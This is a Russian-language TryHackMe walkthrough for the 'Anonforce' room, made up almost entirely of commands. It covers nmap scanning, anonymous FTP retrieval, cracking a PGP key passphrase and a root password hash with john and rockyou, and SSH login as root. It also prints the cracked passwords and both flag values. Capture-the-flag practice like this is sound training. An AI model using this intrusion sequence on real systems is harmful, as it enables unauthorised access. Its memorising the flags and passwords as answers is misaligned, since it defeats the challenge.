[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Anonforce]() 

Всего 1 заданиe:
## Задание 1
Прочитать user.txt и root.txt

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sC -sV <IP>
ftp <IP>
cd home/melodias
get user.txt
cat user.txt
```
```commandline
606083fd33beb1284fc51f411a706af8
```
корень.txt
```commandline
ls /notread
gpg --import private.asc
/data/src/john/run/gpg2john private.asc > pgp.hash
john pgp.hash --wordlist=/data/src/wordlists/rockyou.txt
# xbox360          (anonforce)
gpg --import private.asc
gpg --decrypt backup.pgp
john backup --wordlist=/data/src/wordlists/rockyou.txt
root: hikari
ssh root@<IP>
cat root.txt
```
```commandline
f706456440c7af4187810c31c6cebdce
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)